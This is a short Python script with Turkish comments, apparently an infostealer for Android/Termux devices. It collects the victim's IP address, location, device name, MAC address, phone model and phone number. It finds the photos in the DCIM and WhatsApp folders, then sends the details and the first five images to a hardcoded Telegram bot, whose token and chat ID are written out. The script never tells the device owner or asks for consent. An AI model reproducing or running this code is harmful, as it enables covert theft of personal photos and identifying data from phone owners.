import requests
import os
import platform
import uuid
import subprocess
import glob

# 📢 Telegram Bot Bilgileri
BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

# 📡 IP ve cihaz bilgileri
try:
    ip_response = requests.get("http://ip-api.com/json/", timeout=5)
    ip_data = ip_response.json()
    ip_address = ip_data.get("query", "Bilinmiyor")
    country = ip_data.get("country", "Bilinmiyor")
    city = ip_data.get("city", "Bilinmiyor")
except:
    ip_address, country, city = "Bağlantı hatası", "Bağlantı hatası", "Bağlantı hatası"

device_name = platform.node()
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])

# 📞 Telefon numarası alma
try:
    phone_number = subprocess.check_output(["termux-telephony-call"], stderr=subprocess.DEVNULL).decode().strip()
    if not phone_number:
        phone_number = "Erişim engellendi"
except:
    phone_number = "Desteklenmiyor"

# 📱 Telefon modeli alma
try:
    phone_model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
except:
    phone_model = "Bilinmiyor"

# 📂 WhatsApp & DCIM klasöründen resimleri alma (PNG & JPG)
image_paths = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
image_paths += glob.glob("/sdcard/WhatsApp/**/*.jpg", recursive=True) + glob.glob("/sdcard/WhatsApp/**/*.png", recursive=True)

# 📩 Telegram’a gönderme
message = f"""
📡 **Bilgiler**
🌍 IP: {ip_address}
🇹🇷 Ülke: {country}
🏙️ Şehir: {city}
💻 Cihaz Adı: {device_name}
📡 MAC Adresi: {mac_address}

📞 Telefon Numarası: {phone_number}
📱 Telefon Modeli: {phone_model}

📂 WhatsApp & DCIM'deki resim sayısı: {len(image_paths)}
"""

requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})

# 📤 Resimleri Telegram'a gönderme
for img_path in image_paths[:5]:  # İlk 5 resmi gönder (fazla olursa engellenebilir)
    try:
        with open(img_path, "rb") as img_file:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files={"photo": img_file}, data={"chat_id": CHAT_ID})
    except:
        print(f"⚠️ Gönderilemedi: {img_path}")

print("✅ Bilgiler ve resimler Telegram'a gönderildi.")
